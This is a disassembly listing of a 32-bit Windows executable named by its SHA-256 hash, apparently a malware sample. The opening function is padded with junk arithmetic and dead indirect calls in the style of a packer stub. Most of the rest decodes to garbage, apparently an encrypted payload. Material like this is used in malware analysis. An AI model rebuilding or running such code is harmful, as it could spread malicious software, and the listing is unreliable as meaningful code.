
57a2b0de15ccc61a3c85d39ad8b863b6b7c53e973df59fa44c7c9ef23b20fe0e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xb4
  401009:	mov    eax,DWORD PTR [ebp+0x8]
  40100c:	push   ebx
  40100d:	movzx  ecx,WORD PTR ds:0x426e89
  401014:	or     DWORD PTR ds:0x426eb9,ecx
  40101a:	push   esi
  40101b:	add    ecx,0x2a4c
  401021:	push   edi
  401022:	mov    esi,0x75108b3
  401027:	xor    eax,esi
  401029:	mov    edi,0x3272fa
  40102e:	add    eax,edi
  401030:	mov    DWORD PTR [ebp-0x40],eax
  401033:	xor    eax,ecx
  401035:	mov    eax,ds:0x426149
  40103a:	mov    eax,DWORD PTR [eax]
  40103c:	sbb    ecx,0x1729
  401042:	mov    DWORD PTR [ebp-0x3c],eax
  401045:	and    DWORD PTR ds:0x426ec5,0x0
  40104f:	mov    ecx,DWORD PTR ds:0x426ec5
  401055:	inc    ecx
  401056:	mov    DWORD PTR ds:0x426ec5,ecx
  40105c:	cmp    DWORD PTR ds:0x426ec5,0x24
  401063:	jbe    0x401081
  401069:	jmp    0x401074
  40106e:	call   DWORD PTR ds:0x430a00
  401074:	cmp    DWORD PTR ds:0x426ec5,0x1d
  40107b:	jb     0x40104f
  401081:	mov    eax,ds:0x426359
  401086:	dec    ecx
  401087:	mov    eax,DWORD PTR [eax]
  401089:	dec    ecx
  40108a:	mov    DWORD PTR [ebp-0x1c],eax
  40108d:	mov    DWORD PTR [ebp-0x34],0xf89c87b5
  401094:	sub    DWORD PTR ds:0x426f05,0x3e68
  40109e:	mov    eax,DWORD PTR [ebp-0x34]
  4010a1:	xor    eax,esi
  4010a3:	add    eax,edi
  4010a5:	mov    DWORD PTR [ebp-0x40],eax
  4010a8:	movzx  ecx,WORD PTR ds:0x426f19
  4010af:	sbb    DWORD PTR ds:0x426f05,ecx
  4010b5:	mov    eax,ds:0x4262c9
  4010ba:	mov    DWORD PTR [ebp-0x40],eax
  4010bd:	or     DWORD PTR ds:0x426ee1,0xb11
  4010c7:	mov    eax,DWORD PTR [ebp-0x3c]
  4010ca:	adc    DWORD PTR ds:0x426f05,0x426f01
  4010d4:	mov    DWORD PTR [ebp-0x14],eax
  4010d7:	sub    DWORD PTR ds:0x426ebd,ecx
  4010dd:	mov    eax,DWORD PTR [ebp-0x14]
  4010e0:	push   0x4
  4010e2:	adc    ecx,0x19c9
  4010e8:	pop    ecx
  4010e9:	or     DWORD PTR ds:0x426e85,0x426ee5
  4010f3:	sub    ecx,eax
  4010f5:	add    ecx,DWORD PTR [ebp-0x1c]
  4010f8:	sbb    eax,DWORD PTR ds:0x426f01
  4010fe:	mov    DWORD PTR [ebp-0x2c],0xf89c85f5
  401105:	mov    DWORD PTR [ebp-0x18],ecx
  401108:	mov    eax,ds:0x426e99
  40110d:	or     DWORD PTR ds:0x426f05,eax
  401113:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  40111d:	and    DWORD PTR ds:0x426e81,0x0
  401127:	xor    eax,eax
  401129:	xor    eax,DWORD PTR ds:0x426e81
  40112f:	inc    eax
  401130:	mov    ds:0x426e81,eax
  401135:	cmp    DWORD PTR ds:0x426e81,0x25
  40113c:	jg     0x40117d
  401142:	jmp    0x401170
  401147:	push   DWORD PTR [ebp-0x28]
  40114a:	push   0x1250
  40114f:	push   DWORD PTR [ebp-0x14]
  401152:	push   DWORD PTR [ebp-0x10]
  401155:	push   DWORD PTR [ebp-0x14]
  401158:	push   0x2a2f
  40115d:	push   0x822a
  401162:	push   DWORD PTR [ebp-0x18]
  401165:	push   0x79ea
  40116a:	call   DWORD PTR ds:0x430a04
  401170:	cmp    DWORD PTR ds:0x426e81,0x1e
  401177:	jb     0x401127
  40117d:	mov    eax,DWORD PTR [ebp-0x14]
  401180:	adc    DWORD PTR ds:0x426ee5,0x426ecd
  40118a:	mov    DWORD PTR [ebp-0x9c],eax
  401190:	mov    eax,ds:0x426ec5
  401195:	add    DWORD PTR ds:0x426ebd,eax
  40119b:	mov    eax,DWORD PTR [ebp-0x18]
  40119e:	mov    DWORD PTR [ebp-0x98],eax
  4011a4:	mov    eax,DWORD PTR [ebp-0x2c]
  4011a7:	inc    DWORD PTR ds:0x426edd
  4011ad:	xor    eax,esi
  4011af:	sbb    DWORD PTR ds:0x426eed,0x426e95
  4011b9:	add    eax,edi
  4011bb:	mov    DWORD PTR [ebp-0x94],eax
  4011c1:	lea    eax,[ebp-0x48]
  4011c4:	mov    DWORD PTR [ebp-0x90],eax
  4011ca:	sub    DWORD PTR ds:0x426f15,ecx
  4011d0:	mov    eax,DWORD PTR [ebp-0xa0]
  4011d6:	xor    eax,esi
  4011d8:	and    DWORD PTR ds:0x426ef1,0x42a0
  4011e2:	add    eax,edi
  4011e4:	mov    DWORD PTR [ebp-0xa0],eax
  4011ea:	sub    DWORD PTR ds:0x426f11,0x426e99
  4011f4:	lea    eax,[ebp-0xa0]
  4011fa:	mov    DWORD PTR ds:0x426f11,0x134d
  401204:	push   eax
  401205:	and    eax,0x6f55
  40120a:	mov    eax,DWORD PTR [ebp+0xc]
  40120d:	adc    DWORD PTR ds:0x426e91,0x426f11
  401217:	xor    eax,esi
  401219:	add    eax,edi
  40121b:	mov    DWORD PTR ds:0x426e81,0x195a
  401225:	push   eax
  401226:	mov    eax,ds:0x426f1d
  40122b:	xor    eax,DWORD PTR ds:0x426f0d
  401231:	mov    ds:0x426f1d,eax
  401236:	mov    eax,ds:0x4262e9
  40123b:	adc    DWORD PTR ds:0x426ee5,0x426ec5
  401245:	push   0x42623f
  40124a:	add    DWORD PTR ds:0x426ed1,0x1712
  401254:	push   DWORD PTR [eax]
  401256:	adc    DWORD PTR ds:0x426e91,0x17d3
  401260:	call   0x408594
  401265:	mov    DWORD PTR ds:0x426ee1,0x12
  40126f:	cmp    DWORD PTR ds:0x426ee1,0x0
  401276:	je     0x4012bc
  40127c:	cmp    DWORD PTR ds:0x426ee1,0x4
  401283:	ja     0x4012bc
  401289:	jmp    0x401294
  40128e:	call   DWORD PTR ds:0x430a08
  401294:	cmp    DWORD PTR ds:0x426ee1,0x5
  40129b:	jne    0x4012ac
  4012a1:	mov    eax,ds:0x426ee1
  4012a6:	dec    eax
  4012a7:	mov    ds:0x426ee1,eax
  4012ac:	mov    eax,ds:0x426ee1
  4012b1:	dec    eax
  4012b2:	mov    ds:0x426ee1,eax
  4012b7:	jmp    0x40126f
  4012bc:	mov    ebx,DWORD PTR [ebp-0x14]
  4012bf:	dec    eax
  4012c0:	mov    eax,DWORD PTR [ebp-0x18]
  4012c3:	sub    edx,0x53c
  4012c9:	mov    DWORD PTR [ebp-0x58],eax
  4012cc:	and    DWORD PTR ds:0x426f2d,0x0
  4012d6:	mov    eax,ds:0x426f2d
  4012db:	inc    eax
  4012dc:	mov    ds:0x426f2d,eax
  4012e1:	cmp    DWORD PTR ds:0x426f2d,0x1f
  4012e8:	ja     0x401309
  4012ee:	jmp    0x4012fc
  4012f3:	push   DWORD PTR [ebp-0x18]
  4012f6:	call   DWORD PTR ds:0x430a0c
  4012fc:	cmp    DWORD PTR ds:0x426f2d,0x15
  401303:	jb     0x4012d6
  401309:	mov    DWORD PTR [ebp-0x34],0xf89c8522
  401310:	xor    DWORD PTR ds:0x426ec1,ecx
  401316:	mov    eax,0xf89c85bb
  40131b:	inc    edx
  40131c:	mov    DWORD PTR [ebp-0x1c],eax
  40131f:	lea    ecx,[eax-0x6]
  401322:	sub    DWORD PTR ds:0x426e89,edx
  401328:	mov    DWORD PTR [ebp-0x28],ecx
  40132b:	mov    DWORD PTR ds:0x426f2d,0x18
  401335:	cmp    DWORD PTR ds:0x426f2d,0x0
  40133c:	je     0x401386
  401342:	cmp    DWORD PTR ds:0x426f2d,0xb
  401349:	jbe    0x401386
  40134f:	jmp    0x40135a
  401354:	call   DWORD PTR ds:0x430a38
  40135a:	cmp    DWORD PTR ds:0x426f2d,0xc
  401361:	jne    0x401374
  401367:	mov    edx,DWORD PTR ds:0x426f2d
  40136d:	dec    edx
  40136e:	mov    DWORD PTR ds:0x426f2d,edx
  401374:	mov    edx,DWORD PTR ds:0x426f2d
  40137a:	dec    edx
  40137b:	mov    DWORD PTR ds:0x426f2d,edx
  401381:	jmp    0x401335
  401386:	mov    DWORD PTR [ebp-0x10],0xf89c85b4
  40138d:	mov    DWORD PTR [ebp-0x8],eax
  401390:	mov    eax,DWORD PTR [ebp-0x10]
  401393:	and    DWORD PTR ds:0x426f01,0x0
  40139d:	mov    edx,DWORD PTR ds:0x426f01
  4013a3:	inc    edx
  4013a4:	mov    DWORD PTR ds:0x426f01,edx
  4013aa:	cmp    DWORD PTR ds:0x426f01,0x21
  4013b1:	jle    0x4013d4
  4013b7:	jmp    0x4013c7
  4013bc:	push   0x575d
  4013c1:	call   DWORD PTR ds:0x430a3c
  4013c7:	cmp    DWORD PTR ds:0x426f01,0x11
  4013ce:	jb     0x40139d
  4013d4:	xor    eax,esi
  4013d6:	inc    edx
  4013d7:	mov    edx,0xffcd8d87
  4013dc:	adc    DWORD PTR ds:0x426ea1,0x426ef5
  4013e6:	sub    edx,eax
  4013e8:	mov    DWORD PTR [ebp-0xc],edx
  4013eb:	mov    DWORD PTR [ebp-0x18],0xf89c85b8
  4013f2:	mov    eax,DWORD PTR [ebp-0x8]
  4013f5:	mov    DWORD PTR [ebp-0x3c],ebx
  4013f8:	cmp    eax,ecx
  4013fa:	mov    DWORD PTR ds:0x426e9d,0x528e
  401404:	je     0x403b99
  40140a:	mov    DWORD PTR ds:0x426e95,0x15
  401414:	cmp    DWORD PTR ds:0x426e95,0x0
  40141b:	je     0x401463
  401421:	cmp    DWORD PTR ds:0x426e95,0x19
  401428:	jge    0x401463
  40142e:	jmp    0x401451
  401433:	push   0x426ef9
  401438:	push   0x4b8b
  40143d:	push   DWORD PTR [ebp-0x24]
  401440:	push   0x61ed
  401445:	push   DWORD PTR [ebp-0xc]
  401448:	push   DWORD PTR [ebp-0x1c]
  40144b:	call   DWORD PTR ds:0x430a40
  401451:	mov    ecx,DWORD PTR ds:0x426e95
  401457:	dec    ecx
  401458:	mov    DWORD PTR ds:0x426e95,ecx
  40145e:	jmp    0x401414
  401463:	mov    eax,DWORD PTR [ebp-0x10]
  401466:	and    DWORD PTR ds:0x426e91,0x0
  401470:	jmp    0x401482
  401475:	mov    ecx,DWORD PTR ds:0x426e91
  40147b:	inc    ecx
  40147c:	mov    DWORD PTR ds:0x426e91,ecx
  401482:	cmp    DWORD PTR ds:0x426e91,0x1c
  401489:	jae    0x4014e4
  40148f:	cmp    DWORD PTR ds:0x426e91,0xe
  401496:	jle    0x4014e4
  40149c:	jmp    0x4014c3
  4014a1:	push   0x419a
  4014a6:	push   0x5df1
  4014ab:	push   DWORD PTR [ebp-0x1c]
  4014ae:	push   DWORD PTR [ebp-0xc]
  4014b1:	push   DWORD PTR [ebp-0x18]
  4014b4:	push   DWORD PTR [ebp-0x10]
  4014b7:	push   DWORD PTR [ebp-0x20]
  4014ba:	push   DWORD PTR [ebp-0x28]
  4014bd:	call   DWORD PTR ds:0x430a10
  4014c3:	cmp    DWORD PTR ds:0x426e91,0xd
  4014ca:	jne    0x4014df
  4014d0:	xor    ecx,ecx
  4014d2:	or     ecx,DWORD PTR ds:0x426e91
  4014d8:	inc    ecx
  4014d9:	mov    DWORD PTR ds:0x426e91,ecx
  4014df:	jmp    0x401475
  4014e4:	mov    ecx,DWORD PTR [ebp-0x10]
  4014e7:	xor    eax,esi
  4014e9:	xor    ecx,esi
  4014eb:	xor    DWORD PTR ds:0x426ef1,0x66eb
  4014f5:	lea    ecx,[eax+ecx*1+0x64e5f4]
  4014fc:	or     eax,0x4514
  401501:	mov    eax,DWORD PTR [ebp-0xc]
  401504:	xor    edx,edx
  401506:	sbb    DWORD PTR ds:0x426f0d,0x523c
  401510:	div    ecx
  401512:	mov    eax,DWORD PTR [ebp-0x8]
  401515:	and    DWORD PTR ds:0x426ea9,0x0
  40151f:	mov    ecx,DWORD PTR ds:0x426ea9
  401525:	inc    ecx
  401526:	mov    DWORD PTR ds:0x426ea9,ecx
  40152c:	cmp    DWORD PTR ds:0x426ea9,0xa
  401533:	jg     0x403903
  401539:	jmp    0x401544
  40153e:	call   DWORD PTR ds:0x430a14
  401544:	cmp    DWORD PTR ds:0x426ea9,0x9
  40154b:	jne    0x40155e
  401551:	mov    ecx,DWORD PTR ds:0x426ea9
  401557:	inc    ecx
  401558:	mov    DWORD PTR ds:0x426ea9,ecx
  40155e:	cmp    DWORD PTR ds:0x426ea9,0x10
  401565:	jb     0x40151f
  40156b:	jmp    0x403903
  401570:	sub    BYTE PTR [esi+0x1],ah
  401573:	mov    eax,ds:0x6628e841
  401578:	pop    es
  401579:	and    eax,0xaeeec454
  40157e:	pop    ebx
  40157f:	xor    bh,BYTE PTR [ebx+0x7b]
  401582:	jnp    0x4015ff
  401584:	hlt    
  401585:	pushf  
  401586:	jnp    0x401603
  401588:	ror    ch,cl
  40158a:	aam    0xbe
  40158c:	(bad)  
  40158d:	ret    0xccd8
  401590:	add    cl,0x86
  401593:	xchg   DWORD PTR [ebx-0x75747575],eax
  401599:	mov    bl,0x22
  40159b:	sbb    eax,0x88a991fe
  4015a0:	jle    0x40153a
  4015a2:	push   ecx
  4015a3:	or     DWORD PTR [edx-0x5465d36a],0x64fb6dc1
  4015ad:	ja     0x401543
  4015af:	stos   BYTE PTR es:[edi],al
  4015b0:	jl     0x401566
  4015b2:	jno    0x4015fb
  4015b4:	jl     0x4015f7
  4015b6:	inc    ebx
  4015b7:	mov    eax,0x1d87fccd
  4015bc:	sti    
  4015bd:	nop
  4015be:	jl     0x40159f
  4015c0:	or     dh,BYTE PTR [esi+0x640a3b2a]
  4015c6:	rcr    BYTE PTR [edi],1
  4015c8:	push   0x4896ecc6
  4015cd:	imul   esp,DWORD PTR ds:0xe51a8af4,0x15
  4015d4:	out    dx,eax
  4015d5:	sti    
  4015d6:	(bad)  
  4015d7:	fldcw  WORD PTR [ecx-0x76773813]
  4015dd:	ss dec esp
  4015df:	rcr    BYTE PTR [esi+0x6fc47e2],1
  4015e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015e6:	enter  0xb375,0x29
  4015ea:	cwde   
  4015eb:	neg    bl
  4015ed:	sti    
  4015ee:	jns    0x40162e
  4015f0:	sbb    BYTE PTR [edx],0x59
  4015f3:	pushf  
  4015f4:	push   0x63d5e43e
  4015f9:	scas   al,BYTE PTR es:[edi]
  4015fa:	lock pop edi
  4015fc:	mov    ebp,0x1be87073
  401601:	retf   0x6a93
  401604:	mov    ch,0xb0
  401606:	xchg   ebp,eax
  401607:	add    BYTE PTR [ebx+ebp*2],ch
  40160a:	(bad)  
  40160b:	xor    WORD PTR [ebp*1-0x5dfa7197],si
  401613:	xchg   ebx,eax
  401614:	lods   eax,DWORD PTR ds:[esi]
  401615:	in     eax,dx
  401616:	mov    edi,0x4ae0b7f0
  40161b:	test   al,0x2b
  40161d:	inc    esp
  40161e:	mov    cl,0x21
  401620:	in     eax,0x97
  401622:	cli    
  401623:	xchg   ebx,eax
  401624:	xchg   edi,eax
  401625:	inc    edx
  401626:	test   BYTE PTR [ecx-0x1c5c06c4],0x3b
  40162d:	ins    DWORD PTR es:[edi],dx
  40162e:	test   eax,0x9e60e25f
  401633:	bound  ecx,QWORD PTR [edx+0x4b]
  401636:	jo     0x40164a
  401638:	inc    eax
  401639:	cmp    al,0x62
  40163b:	pusha  
  40163c:	push   ds
  40163d:	fwait
  40163e:	rcr    BYTE PTR [edi+eiz*2+0xb],cl
  401642:	mov    eax,0xc931002
  401647:	mov    bh,BYTE PTR [ecx+0x5f]
  40164a:	jae    0x4016c1
  40164c:	push   ss
  40164d:	scas   eax,DWORD PTR es:[edi]
  40164e:	and    al,0x9f
  401650:	sbb    BYTE PTR [esi-0x5fb6c231],dh
  401656:	dec    eax
  401657:	xor    ah,BYTE PTR [ebp+0x322c2daf]
  40165d:	push   0x3ba1c6f6
  401662:	jmp    0x40168c
  401664:	sub    al,0x3e
  401666:	mov    edx,DWORD PTR [edx-0x3]
  401669:	or     dl,bl
  40166b:	xchg   esi,eax
  40166c:	les    ebx,FWORD PTR [eax+0x5a]
  40166f:	push   ds
  401670:	cmp    ebp,esp
  401672:	ret    
  401673:	xchg   edi,eax
  401674:	and    DWORD PTR [ecx+esi*2+0xca3c075],ebp
  40167b:	jl     0x40161e
  40167d:	and    al,0x9d
  40167f:	nop
  401680:	popa   
  401681:	clc    
  401682:	lods   al,BYTE PTR ds:[esi]
  401683:	shl    ah,1
  401685:	mov    ebp,0xedc0d27d
  40168a:	ret    0xc0f
  40168d:	(bad)  
  40168f:	mov    BYTE PTR [ebp+ebp*1-0x4097cd52],dh
  401696:	push   ebp
  401697:	inc    esp
  401698:	stc    
  401699:	fwait
  40169a:	or     bl,BYTE PTR [edx-0x4c3257c0]
  4016a0:	dec    esp
  4016a1:	dec    edi
  4016a2:	push   edi
  4016a3:	fsub   st(2),st
  4016a5:	fcomp  QWORD PTR [ebx]
  4016a7:	xchg   ebp,eax
  4016a8:	mov    ch,al
  4016aa:	cwde   
  4016ab:	adc    eax,0x6b8b0e9d
  4016b0:	sti    
  4016b1:	aam    0xbb
  4016b3:	inc    edi
  4016b4:	dec    eax
  4016b5:	sub    eax,0x410b9be3
  4016ba:	and    BYTE PTR [ecx+0x2927d7bc],al
  4016c0:	mov    ebx,ecx
  4016c2:	sub    BYTE PTR ds:[edi+0x728ea5f],0x34
  4016ca:	and    dh,BYTE PTR [ecx]
  4016cc:	mov    edx,0xe83b4b68
  4016d1:	pusha  
  4016d2:	push   ecx
  4016d3:	in     eax,0x9e
  4016d5:	cmc    
  4016d6:	add    al,0x7d
  4016d8:	or     cl,BYTE PTR [ecx-0x44f76c4c]
  4016de:	and    DWORD PTR [ecx-0x76],ecx
  4016e1:	xchg   ecx,eax
  4016e2:	loop   0x4016ae
  4016e4:	popa   
  4016e5:	push   cs
  4016e6:	aas    
  4016e7:	jmp    FWORD PTR [ebx]
  4016e9:	jnp    0x4016db
  4016eb:	popa   
  4016ec:	dec    ebx
  4016ed:	fidiv  WORD PTR [esi+0x78]
  4016f0:	mov    bh,0xa5
  4016f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016f3:	dec    esi
  4016f4:	or     DWORD PTR [edi+0x5fa68c1b],0x76
  4016fb:	inc    eax
  4016fc:	or     edx,DWORD PTR [esi-0x5ec53765]
  401702:	dec    esi
  401703:	nop
  401704:	or     BYTE PTR [edx+0x28],dl
  401707:	xor    al,0x59
  401709:	mov    ecx,0x984b5402
  40170e:	fisttp QWORD PTR [esi]
  401710:	jbe    0x4016ce
  401712:	shl    DWORD PTR [eax+edx*4-0x51],cl
  401716:	test   al,0x38
  401718:	push   ebp
  401719:	push   ebx
  40171a:	enter  0xf6ef,0x86
  40171e:	or     eax,0x8a9a3ade
  401723:	jmp    0xea6:0xba66e597
  40172a:	loopne 0x401717
  40172c:	and    DWORD PTR [edx-0x5bbccb84],0x5d
  401733:	pop    eax
  401734:	and    al,0x18
  401736:	data16 xor al,0xf5
  401739:	lods   al,BYTE PTR ds:[esi]
  40173a:	jae    0x4016fc
  40173c:	sub    al,0x42
  40173e:	and    DWORD PTR [ebx],esp
  401740:	pusha  
  401741:	in     eax,dx
  401742:	mul    DWORD PTR [edx+0x1e]
  401745:	bound  edx,QWORD PTR [ebx+eiz*4-0x17]
  401749:	mov    esp,DWORD PTR [ecx+0x679a5c2c]
  40174f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401750:	fsub   DWORD PTR [edi+eiz*4-0x42]
  401754:	pop    ebx
  401755:	push   ds
  401756:	mov    cl,0x61
  401758:	mov    bl,0xb3
  40175a:	adc    dl,BYTE PTR [edx+0x1ea6a0c0]
  401760:	jge    0x401729
  401762:	(bad)
  401765:	fst    DWORD PTR [ecx+ebp*8-0x16dbe588]
  40176c:	pushf  
  40176d:	mov    dl,0x3a
  40176f:	js     0x401726
  401771:	adc    al,0x67
  401773:	rcl    DWORD PTR [edi-0x46eba2a7],cl
  401779:	mov    dl,0x3b
  40177b:	dec    ebx
  40177c:	jno    0x401776
  40177e:	jno    0x401778
  401780:	loop   0x4017ab
  401782:	pop    eax
  401783:	fnstsw WORD PTR [ebx+0x7a595dc8]
  401789:	ret    0x115
  40178c:	pop    esp
  40178d:	xchg   ecx,ebp
  40178f:	mov    ds,WORD PTR ds:0xa48fb4a0
  401795:	mov    esi,DWORD PTR [ecx-0x5916fa5a]
  40179b:	dec    ebp
  40179c:	adc    ebx,DWORD PTR [ecx-0x5855c1d]
  4017a2:	sub    DWORD PTR [edi-0x64],ecx
  4017a5:	into   
  4017a6:	xor    bh,ch
  4017a8:	xchg   ecx,eax
  4017a9:	mov    bl,BYTE PTR [edx]
  4017ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017ac:	add    cl,bl
  4017ae:	xor    eax,0xf77d725
  4017b3:	cmp    DWORD PTR [ecx],ecx
  4017b5:	rcr    BYTE PTR [edx+0x2254f2bc],0xd
  4017bc:	cmp    DWORD PTR [esi],edx
  4017be:	hlt    
  4017bf:	or     esi,DWORD PTR [esi-0x52]
  4017c2:	call   0xf069e88d
  4017c7:	out    0x2,al
  4017c9:	pop    ecx
  4017ca:	jae    0x4017ac
  4017cc:	xchg   ecx,eax
  4017cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ce:	stc    
  4017cf:	mov    ds:0x8fb78afe,al
  4017d4:	sub    al,0x8
  4017d6:	cld    
  4017d7:	pop    ebp
  4017d8:	(bad)  
  4017d9:	mov    WORD PTR [edi],ss
  4017db:	mov    al,0xed
  4017dd:	add    ch,BYTE PTR [edi]
  4017df:	or     BYTE PTR [esi-0x69a5c284],cl
  4017e5:	imul   esp,DWORD PTR [eax+esi*1-0x7d],0x49b87c2e
  4017ed:	push   ebx
  4017ee:	xchg   ebp,eax
  4017ef:	mov    bh,0x6e
  4017f1:	sbb    al,0xec
  4017f3:	imul   BYTE PTR [edx]
  4017f5:	and    BYTE PTR [edi],dl
  4017f7:	xchg   ecx,eax
  4017f8:	push   0xaba4b9bf
  4017fd:	sbb    al,0x18
  4017ff:	in     al,0x51
  401801:	test   DWORD PTR [esi+0x34],ebx
  401804:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401805:	adc    al,0xaf
  401807:	or     ebx,DWORD PTR [edx+ebp*8+0x3b390cfb]
  40180e:	sar    DWORD PTR [edx],1
  401810:	mov    BYTE PTR [edx],bh
  401812:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401813:	stc    
  401814:	mov    esi,0x9fe04cb3
  401819:	dec    eax
  40181a:	cmp    al,0x37
  40181c:	pop    edi
  40181d:	int    0x4e
  40181f:	mov    eax,ds:0xc577cb17
  401824:	adc    dl,dh
  401826:	test   al,0xaf
  401828:	je     0x4017be
  40182a:	cwde   
  40182b:	and    eax,0x1c2f75ad
  401830:	cmp    eax,DWORD PTR [ebx]
  401832:	stos   DWORD PTR es:[edi],eax
  401833:	cmc    
  401834:	xor    ah,0x34
  401837:	inc    ebx
  401838:	pop    es
  401839:	repz mov ebx,0x530739fd
  40183f:	cli    
  401840:	jne    0x401868
  401842:	test   BYTE PTR [ebp-0x51],0xe0
  401846:	and    al,0xbd
  401848:	push   esi
  401849:	sub    al,0x95
  40184b:	in     al,0x70
  40184d:	out    dx,al
  40184e:	sub    cl,BYTE PTR [eax-0x73fb57b2]
  401854:	sbb    BYTE PTR [edi],dl
  401856:	mov    ebx,0x7461117e
  40185b:	sub    DWORD PTR [edi+0x75661ddc],edx
  401861:	cmp    DWORD PTR [esi+0x4f],esp
  401864:	pop    ss
  401865:	cmp    DWORD PTR [edx],esi
  401867:	enter  0x78a0,0xda
  40186b:	push   eax
  40186c:	xchg   ecx,eax
  40186d:	pop    esp
  40186e:	lds    ecx,FWORD PTR [esi-0x6]
  401871:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401872:	popf   
  401873:	sbb    cl,bh
  401875:	out    0x3d,eax
  401877:	or     al,dl
  401879:	retf   
  40187a:	test   DWORD PTR [ebx-0x5d9aed71],ecx
  401880:	lea    ebp,[esp+ecx*2-0x64]
  401884:	les    eax,FWORD PTR [ebp+0x7ebc1510]
  40188a:	fist   DWORD PTR [esi-0x33]
  40188d:	loope  0x40189a
  40188f:	clc    
  401890:	cmp    al,0x92
  401892:	mov    edi,0x2317ca8f
  401897:	call   0xfa15:0xff2f1888
  40189e:	fldcw  WORD PTR [edx+ebx*2-0x64d296c9]
  4018a5:	or     eax,0x5214db16
  4018aa:	push   0x3f
  4018ac:	push   ebp
  4018ad:	mov    ah,0x5c
  4018af:	cld    
  4018b0:	mov    eax,0x65792ca8
  4018b5:	adc    DWORD PTR [eax],ebp
  4018b7:	mov    ds:0x5610b9b8,al
  4018bc:	inc    eax
  4018bd:	sar    ebx,0xed
  4018c0:	jns    0x40187c
  4018c2:	lods   al,BYTE PTR ds:[esi]
  4018c3:	(bad)  
  4018c4:	pop    edi
  4018c5:	ret    
  4018c6:	jmp    0xaa37e73c
  4018cb:	mov    dl,0x59
  4018cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4018ce:	cdq    
  4018cf:	push   ecx
  4018d0:	cmp    al,0x46
  4018d2:	pop    ecx
  4018d3:	imul   ebx,DWORD PTR [edx],0x36
  4018d6:	dec    edx
  4018d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4018d8:	add    esi,edx
  4018da:	(bad)  
  4018db:	xor    BYTE PTR [edi],dl
  4018dd:	fld    st(1)
  4018df:	adc    al,dh
  4018e1:	stos   DWORD PTR es:[edi],eax
  4018e2:	or     dh,BYTE PTR [edx-0x6c667b91]
  4018e8:	pop    ss
  4018e9:	cs dec edi
  4018eb:	mov    ebp,0x4df57150
  4018f0:	stos   DWORD PTR es:[edi],eax
  4018f1:	std    
  4018f2:	bound  edi,QWORD PTR [ebp-0x80]
  4018f5:	das    
  4018f6:	inc    eax
  4018f7:	pop    ebp
  4018f8:	sub    BYTE PTR [eax+0x652bf83a],0xac
  4018ff:	aam    0x9e
  401901:	in     eax,dx
  401902:	pop    ecx
  401903:	or     dh,BYTE PTR [edi-0x1ac7bf2c]
  401909:	jnp    0x40194b
  40190b:	adc    al,0x51
  40190d:	adc    al,0xb3
  40190f:	xchg   ebx,eax
  401910:	cmp    DWORD PTR [esi+0x486d7fb7],esp
  401916:	mov    esp,0xa387e709
  40191b:	push   edi
  40191c:	jmp    0xf88cd43f
  401921:	add    edi,DWORD PTR [eax-0x229e64e4]
  401927:	popa   
  401928:	xor    bl,BYTE PTR [ecx+0x33]
  40192b:	add    eax,0xa82d09a5
  401930:	cmp    eax,0x3532742d
  401935:	ficom  DWORD PTR [edi+0x1a]
  401938:	add    edx,DWORD PTR [ecx-0x4a]
  40193b:	mov    al,ds:0xaadb5ec8
  401940:	call   0x70cf19e7
  401945:	push   ebx
  401946:	sbb    DWORD PTR [edi+0x5e44083c],ebp
  40194c:	aaa    
  40194d:	(bad)  
  40194e:	pop    ebp
  40194f:	or     ecx,DWORD PTR [edx+0x54]
  401952:	push   es
  401953:	jns    0x4019d3
  401955:	push   ds
  401956:	js     0x4018fa
  401958:	out    dx,eax
  401959:	and    BYTE PTR [edx],dl
  40195b:	xor    esi,DWORD PTR [edx+0x4f]
  40195e:	mov    ch,0x21
  401960:	adc    BYTE PTR [ebp-0x7f1b44ba],ch
  401966:	clc    
  401967:	cwde   
  401968:	aam    0xa2
  40196a:	push   0xf755cd29
  40196f:	jmp    0x4019e8
  401971:	jmp    0x7b76:0x892df9b3
  401978:	mov    ds:0x745721bd,eax
  40197d:	into   
  40197e:	xor    BYTE PTR [edi+esi*2+0x78],bl
  401982:	cmp    al,0x1
  401984:	xor    eax,0x8862024b
  401989:	pop    eax
  40198a:	(bad)  
  40198b:	ffreep st(3)
  40198d:	pop    ecx
  40198e:	mov    eax,0xf3925585
  401993:	mov    eax,0x7d90eafb
  401998:	and    ecx,DWORD PTR [ebp+0x696f1afc]
  40199e:	sahf   
  40199f:	jg     0x4019f3
  4019a1:	test   DWORD PTR ds:[edx],ebx
  4019a4:	mov    WORD PTR [ebp-0x43e32f26],?
  4019aa:	fwait
  4019ab:	pop    ss
  4019ac:	(bad)  
  4019ad:	jbe    0x401936
  4019af:	mov    ?,WORD PTR ds:[edi+eax*8]
  4019b3:	jae    0x401a0e
  4019b5:	loop   0x4019bf
  4019b7:	jb     0x40194a
  4019b9:	push   es
  4019ba:	mov    ebp,0xf521b65e
  4019bf:	cli    
  4019c0:	in     al,0x2a
  4019c2:	or     dl,BYTE PTR [edi-0x359fab2]
  4019c8:	das    
  4019c9:	push   ebx
  4019ca:	sbb    BYTE PTR [ebp+0x37941d73],al
  4019d0:	inc    ebp
  4019d1:	pop    edx
  4019d2:	outs   dx,DWORD PTR ds:[esi]
  4019d3:	xlat   BYTE PTR ds:[ebx]
  4019d4:	pop    edx
  4019d5:	add    eax,0xd529caba
  4019da:	inc    esp
  4019db:	add    DWORD PTR [esi-0x6643ec7a],edi
  4019e1:	dec    edx
  4019e2:	popf   
  4019e3:	dec    ecx
  4019e4:	jle    0x401a5f
  4019e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019e7:	mov    BYTE PTR [ebx+0x5e9a256c],bl
  4019ed:	xor    eax,DWORD PTR [esi+0x3f112376]
  4019f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
